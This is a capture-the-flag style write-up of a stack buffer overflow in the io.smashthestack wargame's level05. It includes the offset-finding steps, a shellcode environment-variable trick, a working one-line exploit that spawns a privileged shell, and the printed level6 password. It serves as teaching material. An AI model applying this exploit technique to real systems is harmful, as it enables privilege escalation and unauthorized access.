...
Let's `cd` right into `/levels` and fire up `level05`. It didn't do anything. Instinctively I threw it at [`ltrace`][ltrace] again, but it didn't show much other than the fact that it just exits.

```
__libc_start_main(0x80483b4, 1, 0xbffffd64, 0x8048470, 0x8048420 <unfinished ...>
+++ exited (status 1) +++
```

Fantastic. Enough poking at the program, let's go ahead and look the source code, since it is offered to us.
...
___OH!___ It needs an argument. Okay, that explains why it didn't do anything for us when we ran it before. No matter.

It looks like it uses `strcpy`, which is an extremely well-known [C] function susceptible to [buffer overflow] attacks. We've gone through plenty of these before, (if you haven't, my most extensive and detailed explanation is for level 1 of the [Behemoth] wargame of [Over The Wire]) so doing this [buffer overflow] should just be a matter of cranking out the steps. 

First, we need the offset. Although you can do this "by hand" and just guess-and-check for where the [segfault] occurs and where we can overwrite a return address... but I wanted to do it really easily with [`pattern.py`][pattern.py], so I honestly just ripped it off the server so I would have a local copy to test against (because their server obviously does not have the [`pattern.py`][pattern.py] script available). I did this with:

```
scp level5@io.smashthestack.org:/levels/level05 .
```

Check out the syntax for [`scp`][scp] and read up on it (please) if you have never seen it before; it essentially just lets us copy a file over an [`ssh`][ssh] connection.

After that, I threw stuff at the `level05` binary with [`pattern.py`][pattern.py]:

```
$ pattern.py create 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
$ ./level05 
Segmentation fault (core dumped)
```

Got our [segfault]. Let's find out where it broke, and then throw that back at [`pattern.py`][pattern.py]

```
$ dmesg
[ 7549.786093] level05[6265]: segfault at 37654136 ip 0000000037654136 sp 00000000ffc5ee10 error 14
$ pattern.py offset 37654136
hex pattern decoded as: 6Ae7
140
```

MMmmhmm, okay, offset at `140`. Now we know how much to fill our buffer with; but now we need our [shellcode] and the memory address that it will be at. Let's grab that.

I took the `execve("/bin/bash", [ "/bin/bash -p", 0, 0 ])` [shellcode] from our repository and used that. I set it as an [environment variable] so it would be accessible in memory from the program. To find out its memory address, we actually will need to put the [`getenvaddr.c`][getenvaddr.c] code on the server and compile it so we can run it. We can do all that in a [temporary folder].
...
$ ./getenvaddr PWN /levels/level05
PWN will be at 0xbfffff7d
```

Now that we have a memory address, get it to the string form with [Python]. Hopefully this is all old news to you.

``` python
$ python
>>> struct.pack('<I',0xbfffff7d)
'}\xff\xff\xbf'
```

And let's tack that on to our complete exploit...

```
$ /levels/level05 `python -c "print 'A'*140 + '}\xff\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}���
bash-4.2$ whoami
level6
```

__Ha!__ Got our [shell], and we are currently the `level6` user. 

Let's grab the password and move on!
...
__The password for level6 is `fQ8W8YlSBJBWKV2R`.__

[netcat]: https://en.wikipedia.org/wiki/Netcat
[Wikipedia]: https://www.wikipedia.org/
[Linux]: https://www.linux.com/
[man page]: https://en.wikipedia.org/wiki/Man_pageshellcode
